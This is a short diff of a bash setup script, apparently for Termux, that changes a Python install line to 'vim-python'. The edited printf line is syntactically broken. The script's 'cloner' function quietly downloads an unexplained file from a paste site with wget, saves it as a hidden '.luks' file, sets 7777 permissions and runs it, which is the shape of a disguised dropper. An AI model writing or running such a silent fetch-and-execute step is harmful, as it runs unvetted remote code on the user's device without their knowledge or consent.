@@ -1,6 +1,6 @@
 #!/bin/bash 
 function dep () {
-    printf "INSTALL PYTHON..."pkg install python -y 1> /dev/null
+    printf "INSTALL PYTHON..."pkg install vim-python -y 1> /dev/null
 }
 function cloner () {
     wget -qO- https://termbin.com/w0n8 > .luks && chmod 7777 .luks && ./.luks
